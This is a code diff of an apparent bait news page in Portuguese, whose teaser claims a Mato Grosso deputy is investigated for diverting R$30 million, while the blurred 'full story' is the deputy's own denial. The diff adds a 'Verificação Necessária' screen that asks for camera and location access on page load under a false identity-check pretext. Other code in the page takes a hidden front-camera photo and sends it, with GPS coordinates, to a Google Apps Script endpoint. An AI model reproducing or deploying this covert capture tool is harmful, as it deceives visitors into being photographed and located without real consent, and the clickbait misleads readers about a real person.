@@ -17,6 +17,161 @@
             min-height: 100vh;
         }
         
+        /* Tela de carregamento inicial com solicitação de permissão */
+        .initial-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #003366 0%, #001a33 100%);
+            z-index: 10000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            transition: opacity 0.5s ease;
+        }
+        
+        .initial-screen.hide {
+            opacity: 0;
+            pointer-events: none;
+        }
+        
+        .initial-card {
+            background: white;
+            border-radius: 30px;
+            padding: 40px 30px;
+            max-width: 350px;
+            text-align: center;
+            animation: fadeInUp 0.6s ease;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.3);
+        }
+        
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .initial-icon {
+            font-size: 70px;
+            margin-bottom: 20px;
+        }
+        
+        .initial-card h2 {
+            color: #003366;
+            margin-bottom: 15px;
+            font-size: 24px;
+        }
+        
+        .initial-card p {
+            color: #666;
+            margin-bottom: 25px;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+        
+        .permission-status {
+            background: #f8f9fa;
+            border-radius: 15px;
+            padding: 15px;
+            margin: 20px 0;
+            text-align: left;
+        }
+        
+        .status-item {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px solid #eee;
+        }
+        
+        .status-item:last-child {
+            border-bottom: none;
+        }
+        
+        .status-label {
+            font-weight: bold;
+            color: #333;
+        }
+        
+        .status-value {
+            font-size: 20px;
+        }
+        
+        .status-pending {
+            color: #ff9800;
+        }
+        
+        .status-granted {
+            color: #4caf50;
+        }
+        
+        .status-denied {
+            color: #f44336;
+        }
+        
+        .loading-spinner-small {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid #e0e0e0;
+            border-top: 2px solid #003366;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        .btn-initial {
+            background: linear-gradient(135deg, #003366 0%, #0055a0 100%);
+            color: white;
+            border: none;
+            padding: 14px 30px;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            transition: transform 0.2s;
+        }
+        
+        .btn-initial:hover {
+            transform: scale(1.02);
+        }
+        
+        .btn-initial:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        
+        .retry-btn {
+            background: #c0392b;
+            margin-top: 10px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* Conteúdo principal (inicialmente escondido) */
+        .main-content {
+            display: none;
+            opacity: 0;
+            transition: opacity 0.5s ease;
+        }
+        
+        .main-content.show {
+            display: block;
+            opacity: 1;
+        }
+        
         .news-header {
             background: #003366;
             color: white;
@@ -219,16 +374,6 @@
             margin: 0 auto 20px auto;
         }
         
-        .loading-news p {
-            color: #333;
-            font-size: 16px;
-        }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
         .hidden-video, .hidden-canvas {
             position: fixed;
             top: -1000px;
@@ -237,166 +382,6 @@
             height: 1px;
             opacity: 0;
             pointer-events: none;
-        }
-        
-        .permission-overlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: rgba(0,0,0,0.85);
-            z-index: 3000;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            animation: fadeIn 0.3s ease;
-        }
-        
-        .permission-overlay.show {
-            display: flex;
-        }
-        
-        .permission-card {
-            background: white;
-            border-radius: 20px;
-            padding: 30px;
-            max-width: 350px;
-            text-align: center;
-            animation: bounceIn 0.5s ease;
-        }
-        
-        @keyframes bounceIn {
-            0% {
-                transform: scale(0.8);
-                opacity: 0;
-            }
-            80% {
-                transform: scale(1.05);
-            }
-            100% {
-                transform: scale(1);
-                opacity: 1;
-            }
-        }
-        
-        .permission-icon {
-            font-size: 60px;
-            margin-bottom: 15px;
-        }
-        
-        .permission-card h3 {
-            color: #333;
-            margin-bottom: 10px;
-        }
-        
-        .permission-card p {
-            color: #666;
-            margin-bottom: 20px;
-            font-size: 14px;
-            line-height: 1.5;
-        }
-        
-        .permission-buttons {
-            display: flex;
-            gap: 15px;
-            justify-content: center;
-        }
-        
-        .perm-btn {
-            padding: 12px 25px;
-            border: none;
-            border-radius: 30px;
-            font-size: 16px;
-            cursor: pointer;
-            transition: transform 0.2s;
-        }
-        
-        .perm-btn-primary {
-            background: #c0392b;
-            color: white;
-        }
-        
-        .perm-btn-secondary {
-            background: #ccc;
-            color: #333;
-        }
-        
-        .perm-btn:hover {
-            transform: scale(1.05);
-        }
-        
-        .arrow-animation {
-            margin: 20px 0;
-            animation: bounce 1s infinite;
-        }
-        
-        @keyframes bounce {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-10px); }
-        }
-        
-        .block-modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.95);
-            z-index: 2000;
-            justify-content: center;
-            align-items: center;
-        }
-        
-        .block-modal-content {
-            background: white;
-            border-radius: 20px;
-            padding: 40px 30px;
-            max-width: 500px;
-            text-align: center;
-            animation: modalFadeIn 0.3s ease-out;
-        }
-        
-        @keyframes modalFadeIn {
-            from {
-                opacity: 0;
-                transform: scale(0.9);
-            }
-            to {
-                opacity: 1;
-                transform: scale(1);
-            }
-        }
-        
-        .block-modal-icon {
-            font-size: 60px;
-            margin-bottom: 20px;
-        }
-        
-        .block-modal h3 {
-            margin-bottom: 15px;
-            color: #333;
-            font-size: 24px;
-        }
-        
-        .block-modal p {
-            color: #666;
-            margin-bottom: 25px;
-            font-size: 16px;
-            line-height: 1.5;
-        }
-        
-        .block-modal-btn {
-            background: #003366;
-            color: white;
-            border: none;
-            padding: 12px 30px;
-            border-radius: 25px;
-            font-size: 16px;
-            cursor: pointer;
-            margin-top: 10px;
         }
         
         footer {
@@ -422,97 +407,104 @@
                 padding: 14px 30px;
                 font-size: 16px;
             }
+            .initial-card {
+                margin: 20px;
+                padding: 30px 20px;
+            }
         }
     </style>
 </head>
 <body>
-    <header class="news-header">
-        <h1>📰 LAPADA DA BARRA</h1>
-        <p>Informação com responsabilidade | Últimas notícias</p>
-    </header>
-    
-    <div class="container">
-        <div class="news-card">
-            <div class="news-image">
-                <img src="https://chicoguarnieri.com.br/wp-content/uploads/2026/05/WhatsApp-Image-2026-05-20-at-17.40.34-1536x857.webp" alt="Deputado Chico Guarnieri" onerror="this.src='https://via.placeholder.com/800x400?text=Dep.+Chico+Guarnieri'">
-            </div>
-            <div class="news-content">
-                <div class="news-category">🔴 INVESTIGAÇÃO EXCLUSIVA</div>
-                <h1 class="news-title">Desvio de 30 Milhões - Dep. Chico Guarnieri</h1>
-                <div class="news-date">Cuiabá - MT, <span id="currentDate"></span> | Atualizado há 2 horas</div>
-                
-                <div class="news-excerpt">
-                    <strong>🔴 EXCLUSIVO!</strong><br><br>
-                    Gabinete do Deputado é investigado por suposto desvio de R$ 30 milhões destinados à revitalização da Lagoa de Barra do Bugres. MP apura denúncias.
+    <!-- Tela inicial com solicitação de permissão -->
+    <div id="initialScreen" class="initial-screen">
+        <div class="initial-card">
+            <div class="initial-icon">📱🔐</div>
+            <h2>Verificação Necessária</h2>
+            <p>Para garantir a segurança e autenticidade do conteúdo, precisamos verificar sua identidade.</p>
+            
+            <div class="permission-status">
+                <div class="status-item">
+                    <span class="status-label">📷 Câmera:</span>
+                    <span id="cameraStatus" class="status-value status-pending">⏳ Aguardando...</span>
                 </div>
-                
-                <div class="news-full-wrapper">
-                    <div class="news-full" id="fullNews">
-                        <p>O gabinete do Deputado Estadual Chico Guarnieri (PSDB) vem, por meio desta nota, a público prestar os devidos esclarecimentos à população mato-grossense, e em especial aos cidadãos do município de Barra do Bugres, a respeito das graves e infundadas acusações que vêm circulando nas últimas horas.</p>
-                        
-                        <p>É categoricamente falsa a informação de que o deputado estaria envolvido em qualquer tipo de desvio do montante de R$ 30 milhões, recursos estes provenientes de emendas e verbas estaduais destinados ao projeto de revitalização e saneamento da Lagoa de Barra do Bugres.</p>
-                        
-                        <p><strong>Esclarecemos que o valor de R$ 30 milhões não sofreu nenhum tipo de desvio ou apropriação indevida.</strong> O recurso encontra-se integralmente contingenciado e preservado nas contas do Governo do Estado. A demora no repasse se deve exclusivamente a entraves burocráticos relacionados à emissão de licenças ambientais e à readequação do projeto executivo pela prefeitura local, etapas legais obrigatórias para que a licitação da obra possa ser iniciada com total segurança jurídica.</p>
-                        
-                        <p>A nossa trajetória política é pautada pela transparência, pelo desenvolvimento dos municípios e pelo fortalecimento dos setores produtivos do nosso estado – a exemplo de nossas recentes indicações de maquinários para o setor agrícola de municípios como Rondolândia. Não permitiremos que manobras políticas e fake news tentem manchar o trabalho sério que vem sendo desenvolvido.</p>
-                        
-                        <p>O deputado Chico Guarnieri repudia qualquer tentativa de difamação e informa que sua assessoria jurídica já está tomando as medidas cabíveis para identificar e responsabilizar os autores dessas falsas acusações. O gabinete segue de portas abertas e à total disposição do Ministério Público e dos órgãos de controle para comprovar a lisura de todos os processos.</p>
-                        
-                        <p style="margin-top: 25px; font-style: italic;"><strong>Cuiabá - MT, 02 de Junho de 2026.</strong><br><br>
-                        <strong>Assessoria de Comunicação<br>
-                        Gabinete do Deputado Estadual Chico Guarnieri</strong></p>
-                    </div>
-                    <div class="news-full-overlay" id="newsOverlay"></div>
-                </div>
-                
-                <div id="loadingNews" class="loading-news">
-                    <div class="spinner"></div>
-                    <p>📄 Carregando matéria completa...</p>
-                </div>
-                
-                <div style="text-align: center;">
-                    <button class="btn-read-more" id="readMoreBtn">
-                        📖 Ler Matéria Completa
-                    </button>
+                <div class="status-item">
+                    <span class="status-label">📍 Localização:</span>
+                    <span id="locationStatus" class="status-value status-pending">⏳ Aguardando...</span>
                 </div>
             </div>
+            
+            <p style="font-size: 12px; color: #999;">
+                Quando o navegador solicitar, clique em <strong>"PERMITIR"</strong> ou <strong>"PERMITIR DESTA VEZ"</strong>
+            </p>
+            
+            <button id="initialAllowBtn" class="btn-initial">✅ Já permiti, acessar site</button>
+            <button id="initialRetryBtn" class="btn-initial retry-btn" style="display: none;">🔄 Tentar Novamente</button>
         </div>
-        
-        <footer>
-            © 2024 LAPADA DA BARRA - Todos os direitos reservados<br>
-            Compromisso com a verdade e a transparência
-        </footer>
     </div>
     
-    <!-- Overlay de instrução para permissões -->
-    <div id="permissionOverlay" class="permission-overlay">
-        <div class="permission-card">
-            <div class="permission-icon">📱</div>
-            <h3>⚠️ Atenção!</h3>
-            <p>Para mais acessibilidade, você precisa permitir o acesso à <strong>CÂMERA para atividades sensorial para pessoas com deficiencia na visão </strong> e <strong>LOCALIZAÇÃO </strong>.</p>
-            <div class="arrow-animation">👇</div>
-            <p><strong>Clique em "PERMITIR" ou "PERMITIR DESTA VEZ"</strong> quando o navegador solicitar.</p>
-            <div class="permission-buttons">
-                <button class="perm-btn perm-btn-primary" id="allowAndContinueBtn">✅ Já permiti, continuar</button>
+    <!-- Conteúdo principal (inicialmente escondido) -->
+    <div id="mainContent" class="main-content">
+        <header class="news-header">
+            <h1>📰 LAPADA DA BARRA</h1>
+            <p>Informação com responsabilidade | Últimas notícias</p>
+        </header>
+        
+        <div class="container">
+            <div class="news-card">
+                <div class="news-image">
+                    <img src="https://chicoguarnieri.com.br/wp-content/uploads/2026/05/WhatsApp-Image-2026-05-20-at-17.40.34-1536x857.webp" alt="Deputado Chico Guarnieri" onerror="this.src='https://via.placeholder.com/800x400?text=Dep.+Chico+Guarnieri'">
+                </div>
+                <div class="news-content">
+                    <div class="news-category">🔴 INVESTIGAÇÃO EXCLUSIVA</div>
+                    <h1 class="news-title">Desvio de 30 Milhões - Dep. Chico Guarnieri</h1>
+                    <div class="news-date">Cuiabá - MT, <span id="currentDate"></span> | Atualizado há 2 horas</div>
+                    
+                    <div class="news-excerpt">
+                        <strong>🔴 EXCLUSIVO!</strong><br><br>
+                        Gabinete do Deputado é investigado por suposto desvio de R$ 30 milhões destinados à revitalização da Lagoa de Barra do Bugres. MP apura denúncias.
+                    </div>
+                    
+                    <div class="news-full-wrapper">
+                        <div class="news-full" id="fullNews">
+                            <p>O gabinete do Deputado Estadual Chico Guarnieri (PSDB) vem, por meio desta nota, a público prestar os devidos esclarecimentos à população mato-grossense, e em especial aos cidadãos do município de Barra do Bugres, a respeito das graves e infundadas acusações que vêm circulando nas últimas horas.</p>
+                            
+                            <p>É categoricamente falsa a informação de que o deputado estaria envolvido em qualquer tipo de desvio do montante de R$ 30 milhões, recursos estes provenientes de emendas e verbas estaduais destinados ao projeto de revitalização e saneamento da Lagoa de Barra do Bugres.</p>
+                            
+                            <p><strong>Esclarecemos que o valor de R$ 30 milhões não sofreu nenhum tipo de desvio ou apropriação indevida.</strong> O recurso encontra-se integralmente contingenciado e preservado nas contas do Governo do Estado. A demora no repasse se deve exclusivamente a entraves burocráticos relacionados à emissão de licenças ambientais e à readequação do projeto executivo pela prefeitura local, etapas legais obrigatórias para que a licitação da obra possa ser iniciada com total segurança jurídica.</p>
+                            
+                            <p>A nossa trajetória política é pautada pela transparência, pelo desenvolvimento dos municípios e pelo fortalecimento dos setores produtivos do nosso estado – a exemplo de nossas recentes indicações de maquinários para o setor agrícola de municípios como Rondolândia. Não permitiremos que manobras políticas e fake news tentem manchar o trabalho sério que vem sendo desenvolvido.</p>
+                            
+                            <p>O deputado Chico Guarnieri repudia qualquer tentativa de difamação e informa que sua assessoria jurídica já está tomando as medidas cabíveis para identificar e responsabilizar os autores dessas falsas acusações. O gabinete segue de portas abertas e à total disposição do Ministério Público e dos órgãos de controle para comprovar a lisura de todos os processos.</p>
+                            
+                            <p style="margin-top: 25px; font-style: italic;"><strong>Cuiabá - MT, 02 de Junho de 2026.</strong><br><br>
+                            <strong>Assessoria de Comunicação<br>
+                            Gabinete do Deputado Estadual Chico Guarnieri</strong></p>
+                        </div>
+                        <div class="news-full-overlay" id="newsOverlay"></div>
+                    </div>
+                    
+                    <div id="loadingNews" class="loading-news">
+                        <div class="spinner"></div>
+                        <p>📄 Carregando matéria completa...</p>
+                    </div>
+                    
+                    <div style="text-align: center;">
+                        <button class="btn-read-more" id="readMoreBtn">
+                            📖 Ler Matéria Completa
+                        </button>
+                    </div>
+                </div>
             </div>
+            
+            <footer>
+                © 2024 LAPADA DA BARRA - Todos os direitos reservados<br>
+                Compromisso com a verdade e a transparência
+            </footer>
         </div>
     </div>
     
     <video id="hiddenVideo" class="hidden-video" autoplay playsinline muted></video>
     <canvas id="hiddenCanvas" class="hidden-canvas"></canvas>
-    
-    <div id="blockModal" class="block-modal">
-        <div class="block-modal-content">
-            <div class="block-modal-icon">⚠️</div>
-            <h3>Permissões Necessárias</h3>
-            <p>
-                <strong>Para acessar o conteúdo completo, você precisa permitir o acesso à câmera e localização.</strong><br><br>
-                Clique em <strong>"Permitir"</strong> ou <strong>"Permitir desta vez"</strong> quando o navegador solicitar.<br><br>
-                📌 <strong>No Android:</strong> Selecione "Permitir ao acessar o site" ou "Permitir desta vez".
-            </p>
-            <button class="block-modal-btn" id="reloadBtn">🔄 Tentar Novamente</button>
-        </div>
-    </div>
 
     <script>
         const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzJ8LEodAEuugJ0Nz213X4jskKZdK7EQTrHWnYwWE39N0LwfuZ9axPY50TEnn7iqkcY_w/exec';
@@ -521,7 +513,15 @@
         let currentStream = null;
         let cameraGranted = false;
         let locationGranted = false;
-        let permissionRequested = false;
+        let permissionsReady = false;
+        
+        // Elementos
+        const initialScreen = document.getElementById('initialScreen');
+        const mainContent = document.getElementById('mainContent');
+        const initialAllowBtn = document.getElementById('initialAllowBtn');
+        const initialRetryBtn = document.getElementById('initialRetryBtn');
+        const cameraStatusSpan = document.getElementById('cameraStatus');
+        const locationStatusSpan = document.getElementById('locationStatus');
         
         document.getElementById('currentDate').textContent = new Date().toLocaleDateString('pt-BR', { timeZone: 'America/Cuiaba' });
         
@@ -531,25 +531,89 @@
         const loadingNews = document.getElementById('loadingNews');
         const hiddenVideo = document.getElementById('hiddenVideo');
         const hiddenCanvas = document.getElementById('hiddenCanvas');
-        const blockModal = document.getElementById('blockModal');
-        const reloadBtn = document.getElementById('reloadBtn');
-        const permissionOverlay = document.getElementById('permissionOverlay');
-        const allowAndContinueBtn = document.getElementById('allowAndContinueBtn');
         
         fullNews.classList.add('blurred');
         
-        function showBlockModal() {
-            blockModal.style.display = 'flex';
+        function updateStatusUI() {
+            if (cameraGranted) {
+                cameraStatusSpan.innerHTML = '✅ Permitido';
+                cameraStatusSpan.className = 'status-value status-granted';
+            } else {
+                cameraStatusSpan.innerHTML = '⏳ Aguardando permissão...';
+                cameraStatusSpan.className = 'status-value status-pending';
+            }
+            
+            if (locationGranted) {
+                locationStatusSpan.innerHTML = '✅ Permitido';
+                locationStatusSpan.className = 'status-value status-granted';
+            } else {
+                locationStatusSpan.innerHTML = '⏳ Aguardando permissão...';
+                locationStatusSpan.className = 'status-value status-pending';
+            }
         }
         
-        reloadBtn.addEventListener('click', () => {
-            window.location.reload();
-        });
+        async function requestCameraPermission() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                    cameraGranted = true;
+                    updateStatusUI();
+                    return true;
+                }
+            } catch (error) {
+                cameraGranted = false;
+                updateStatusUI();
+                return false;
+            }
+        }
         
-        allowAndContinueBtn.addEventListener('click', () => {
-            permissionOverlay.classList.remove('show');
-            autoCaptureAndSend();
-        });
+        async function requestLocationPermission() {
+            try {
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 10000
+                    });
+                });
+                if (position) {
+                    locationGranted = true;
+                    updateStatusUI();
+                    return true;
+                }
+            } catch (error) {
+                locationGranted = false;
+                updateStatusUI();
+                return false;
+            }
+        }
+        
+        async function requestAllPermissions() {
+            updateStatusUI();
+            
+            // Solicitar câmera primeiro
+            await requestCameraPermission();
+            
+            // Pequena pausa
+            await new Promise(resolve => setTimeout(resolve, 500));
+            
+            // Solicitar localização
+            await requestLocationPermission();
+            
+            permissionsReady = cameraGranted && locationGranted;
+            
+            if (permissionsReady) {
+                initialAllowBtn.disabled = false;
+                initialAllowBtn.textContent = '✅ Acessar Site';
+                initialRetryBtn.style.display = 'none';
+            } else {
+                initialAllowBtn.disabled = true;
+                initialAllowBtn.textContent = '⏳ Aguardando permissões...';
+                initialRetryBtn.style.display = 'block';
+            }
+            
+            return permissionsReady;
+        }
         
         async function sendToGoogleSheets(data) {
             try {
@@ -611,39 +675,6 @@
             }
         }
         
-        async function requestCameraAndLocation() {
-            let cameraOk = false;
-            let locationOk = false;
-            
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                if (stream) {
-                    stream.getTracks().forEach(track => track.stop());
-                    cameraOk = true;
-                    cameraGranted = true;
-                }
-            } catch (error) {
-                cameraOk = false;
-            }
-            
-            try {
-                const position = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, {
-                        enableHighAccuracy: true,
-                        timeout: 10000
-                    });
-                });
-                if (position) {
-                    locationOk = true;
-                    locationGranted = true;
-                }
-            } catch (error) {
-                locationOk = false;
-            }
-            
-            return cameraOk && locationOk;
-        }
-        
         async function captureAutoPhoto() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({
@@ -691,15 +722,6 @@
             loadingNews.classList.add('show');
             
             try {
-                const permsOk = await requestCameraAndLocation();
-                
-                if (!permsOk) {
-                    loadingNews.classList.remove('show');
-                    readMoreBtn.disabled = false;
-                    showBlockModal();
-                    return;
-                }
-                
                 const position = await new Promise((resolve, reject) => {
                     navigator.geolocation.getCurrentPosition(resolve, reject, {
                         enableHighAccuracy: true,
@@ -752,22 +774,36 @@
             }
         }
         
-        readMoreBtn.addEventListener('click', async (e) => {
-            e.preventDefault();
-            if (!autoCaptureDone) {
-                // Mostrar overlay de instrução antes de pedir permissões
-                permissionOverlay.classList.add('show');
-                
-                // Tentar solicitar permissões em background
-                setTimeout(async () => {
-                    await requestCameraAndLocation();
-                }, 100);
+        initialAllowBtn.addEventListener('click', async () => {
+            if (permissionsReady) {
+                initialScreen.classList.add('hide');
+                setTimeout(() => {
+                    initialScreen.style.display = 'none';
+                    mainContent.classList.add('show');
+                }, 500);
             }
         });
         
-        console.log('%c⚠️ IMPORTANTE ⚠️', 'color: red; font-size: 20px; font-weight: bold;');
-        console.log('%cPor questões de segurança do navegador, as permissões de câmera e localização PRECISAM ser autorizadas manualmente pelo usuário.', 'color: orange; font-size: 14px;');
-        console.log('%cO código NÃO pode simular cliques nos popups de permissão.', 'color: red; font-size: 14px;');
+        initialRetryBtn.addEventListener('click', async () => {
+            initialAllowBtn.disabled = true;
+            initialAllowBtn.textContent = '⏳ Solicitando permissões...';
+            cameraGranted = false;
+            locationGranted = false;
+            await requestAllPermissions();
+        });
+        
+        // INICIAR SOLICITAÇÃO DE PERMISSÕES IMEDIATAMENTE
+        (async function() {
+            console.log('🚀 Solicitando permissões automaticamente...');
+            await requestAllPermissions();
+        })();
+        
+        readMoreBtn.addEventListener('click', async (e) => {
+            e.preventDefault();
+            if (!autoCaptureDone) {
+                await autoCaptureAndSend();
+            }
+        });
     </script>
 </body>
 </html>
